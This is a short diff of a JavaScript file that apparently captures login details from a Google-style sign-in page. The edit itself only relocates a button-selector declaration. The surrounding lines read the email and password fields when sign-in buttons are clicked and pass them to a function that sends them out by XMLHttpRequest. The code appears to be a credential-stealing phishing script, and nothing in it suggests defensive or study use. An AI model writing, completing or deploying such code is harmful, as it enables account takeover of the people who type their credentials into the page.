@@ -1,6 +1,8 @@
 let user;
 let pass;
 
+const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
+
 function send_email(){
     let email = document.querySelector('[type="email"]');
     let param = email.value;
@@ -9,8 +11,6 @@ function send_email(){
 }
 
 function send_pwd(){
-    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
-
     btn[1].addEventListener('click', function(){
 
     let pwd = document.querySelector('[type="password"]');
@@ -56,8 +56,6 @@ function teste_send(u, pwd){
     xhr.send();
 }
 
-
-const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
     send_email();
